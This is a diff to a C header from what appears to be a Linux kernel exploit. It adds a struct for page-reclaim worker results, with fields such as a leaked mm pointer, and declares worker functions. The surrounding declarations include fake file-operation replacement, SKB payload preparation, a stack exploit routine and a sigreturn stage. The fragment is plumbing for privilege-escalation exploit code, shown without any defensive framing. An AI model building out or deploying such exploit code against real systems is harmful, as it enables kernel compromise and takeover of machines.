@@ -181,6 +181,17 @@ struct mm_ctx {
   int *memfds;
 };
 
+struct songyuan_page_result {
+  uintptr_t page;
+  uintptr_t lock;
+  uintptr_t task;
+  uintptr_t leaked_mm;
+  size_t send_size;
+  int reclaim_sent;
+  int reclaim_want;
+  size_t worker_index;
+};
+
 struct user_pipe_buffer {
   uint64_t page;
   uint32_t offset;
@@ -290,6 +301,7 @@ extern atomic_int fake_fops_done;
 int exp_stack_once(uint64_t *buffer);
 #ifdef USE_NATIVE_SIGRETURN_STAGE
 int songyuan_native_sigreturn_stage(const uint64_t *buffer);
+int songyuan_native_workers_prepare(size_t count);
 #endif
 int install_embedded_exp32(void);
 int doreplacefops(void);
@@ -336,6 +348,9 @@ void prepare_ctxs(void);
 int prepare_skb_payload(uintptr_t base, int payload_mode);
 uintptr_t prepare_kernel_page(int payload_mode);
 uintptr_t prepare_good_kernel_page(int payload_mode);
+int songyuan_page_workers_prepare(size_t count);
+int songyuan_page_worker_acquire(struct songyuan_page_result *result);
+void songyuan_page_worker_release(size_t worker_index);
 /* Optional hooks for tracing around the SKB reclaim window only. */
 typedef void (*page_reclaim_trace_fn)(void);
 void set_page_reclaim_trace_hooks(page_reclaim_trace_fn begin,
